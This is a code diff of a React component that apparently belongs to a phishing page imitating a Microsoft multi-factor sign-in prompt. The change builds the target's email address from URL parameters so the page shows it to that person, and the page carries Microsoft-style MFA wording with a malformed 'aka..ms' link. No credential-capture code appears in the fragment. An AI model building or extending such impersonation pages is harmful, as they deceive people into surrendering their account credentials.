@@ -5,7 +5,7 @@ import { useParams } from "react-router-dom";
 import { BsTelephoneInbound } from "react-icons/bs";
 
 export default function Hom() {
-  const { mail } = useParams();
+  const { mail, host, ext } = useParams();
   const [show, setShow] = useState(true);
   return (
     <div className="container">
@@ -22,7 +22,9 @@ export default function Hom() {
               paddingLeft: "3rem",
             }}
           >
-            <p style={{ margin: "0px", fontSize: "18px" }}>{mail}</p>
+            <p style={{ margin: "0px", fontSize: "18px" }}>
+              {mail}@{host}.{ext}
+            </p>
           </div>
           {show ? (
             <div>
@@ -35,7 +37,10 @@ export default function Hom() {
               </div>
               <div className="ca">
                 <p className="st">More information</p>
-                <p>Are your verification methods current? Check at https://aka..ms/mfasetup</p>
+                <p>
+                  Are your verification methods current? Check at
+                  https://aka..ms/mfasetup
+                </p>
               </div>
               <button className="can">Cancel</button>
             </div>
